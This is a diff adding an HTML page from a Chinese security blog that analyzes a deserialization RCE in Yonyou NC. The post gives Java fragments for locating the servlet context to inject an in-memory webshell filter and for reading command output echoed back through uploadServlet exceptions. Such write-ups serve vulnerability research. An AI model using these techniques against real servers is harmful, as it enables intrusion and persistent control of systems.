@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="用友 NC 反序列化RCE漏洞漏洞描述用友NC 存在反序列化 RCE漏洞，攻击者可利用控制服务器 漏洞影响 [!NOTE] 用友 NC  漏洞复现首先从任意文件上传说起 任意文件上传分析代码在servlet.FileReceiveServlet。在这里我们可以看到，从请求中读取流，然后转换为map类型并读取上传文件的路径。然后再读取待上传的文件。  而网上很多poc，大多都是基于此漏洞，利用反序列">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E7%94%A8%E5%8F%8Bnc/%E7%94%A8%E5%8F%8B%20NC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="用友 NC 反序列化RCE漏洞漏洞描述用友NC 存在反序列化 RCE漏洞，攻击者可利用控制服务器 漏洞影响 [!NOTE] 用友 NC  漏洞复现首先从任意文件上传说起 任意文件上传分析代码在servlet.FileReceiveServlet。在这里我们可以看到，从请求中读取流，然后转换为map类型并读取上传文件的路径。然后再读取待上传的文件。  而网上很多poc，大多都是基于此漏洞，利用反序列">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8BNC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/media/1.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8BNC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/media/2.png">
+<meta property="article:published_time" content="2022-07-08T06:26:11.682Z">
+<meta property="article:modified_time" content="2022-07-08T07:18:09.466Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/%E7%94%A8%E5%8F%8BNC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/media/1.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-用友nc/用友 NC 反序列化RCE漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E7%94%A8%E5%8F%8Bnc/%E7%94%A8%E5%8F%8B%20NC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.682Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="用友-NC-反序列化RCE漏洞"><a href="#用友-NC-反序列化RCE漏洞" class="headerlink" title="用友 NC 反序列化RCE漏洞"></a>用友 NC 反序列化RCE漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>用友NC 存在反序列化 RCE漏洞，攻击者可利用控制服务器</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>用友 NC</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先从任意文件上传说起</p>
+<p>任意文件上传分析代码在<code>servlet.FileReceiveServlet</code>。在这里我们可以看到，从请求中读取流，然后转换为map类型并读取上传文件的路径。然后再读取待上传的文件。</p>
+<p><img src="/resource/%E7%94%A8%E5%8F%8BNC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/media/1.png"></p>
+<p>而网上很多poc，大多都是基于此漏洞，利用反序列化上传一个文件到服务器。</p>
+<p>这也就是去年的那个任意文件上传的反序列化漏洞。但是，但是，这个漏洞本质是一个反序列化漏洞。而且某C的classpath中，也存在apache commonscollections库，我们可以利用这个库，直接执行命令或者内存马。岂不是比任意文件上传舒服多了。</p>
+<p><strong>内存马</strong></p>
+<p>老样子，在反序列化中想执行任意代码，一般都依靠xalan这个库。这次也不例外。</p>
+<p>植入内存马，关键在于我们怎样找到context，只有找到context，我们才可以添加filter。好在某c中，我们只需要通过下面的代码既可以获取当前context，不需要从tomcat中获取context</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> 改动Locator.getInstance().lookup(<span class="string">&quot;ServletContext&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">obj = contextField.get(obj);</span><br><span class="line"><span class="type">Field</span> <span class="variable">contextField1</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">contextField1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">addFitlertoTomcat(contextField1.get(obj));</span><br></pre></td></tr></table></figure>
+
+<p>剩下的就是常规操作，可以看我之前的内存马模型，基本不需要很大的改动即可完美适配。</p>
+<p><img src="/resource/%E7%94%A8%E5%8F%8BNC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/media/2.png"></p>
+<p><strong>回显</strong></p>
+<p>我们只需要找到这样一个servlet，即存在反序列化的readObject，又将错误信息写入到response中</p>
+<p>不难看出 uploadServlet 就很满足这个需求。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    out = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(output);</span><br><span class="line">    in = <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(request.getInputStream());</span><br><span class="line">    <span class="type">String</span> <span class="variable">dsName</span> <span class="operator">=</span> (String)in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">    var14.printStackTrace();</span><br><span class="line">    <span class="keyword">if</span> (out == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(var14);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    out.writeObject(var14);</span><br></pre></td></tr></table></figure>
+
+<p>如果出错的话，将错误信息通过序列化写入到response中。好处在于，我们不需要麻烦的去找tomcat的response对象。</p>
+<p>所以，我们将反序列化的payload，发送给uploadServlet即可。然后我们只需要读取响应，即可拿到服务器命令执行的回显结果。客户端代码可以这样写</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(r));</span><br><span class="line"><span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> (Exception) objectInputStream.readObject();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> e.getCause();</span><br><span class="line"><span class="type">Field</span> <span class="variable">targetF</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">targetF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">obj = targetF.get(obj);</span><br><span class="line"><span class="type">Field</span> <span class="variable">msgF</span> <span class="operator">=</span> obj.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;detailMessage&quot;</span>);</span><br><span class="line">msgF.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> msgF.get(obj).toString();</span><br><span class="line">System.out.println(msg);</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/IdXYbjNVGVIasuwQH48Q1w">https://mp.weixin.qq.com/s/IdXYbjNVGVIasuwQH48Q1w</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E7%94%A8%E5%8F%8Bnc/%E7%94%A8%E5%8F%8B%20NC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r1ub00rny8v1cg1q2qms" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/%E7%94%A8%E5%8F%8Bnc/%E7%94%A8%E5%8F%8BERP-NC%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/%E7%94%A8%E5%8F%8Bnc/%E7%94%A8%E5%8F%8B%20NC%20XbrlPersistenceServlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
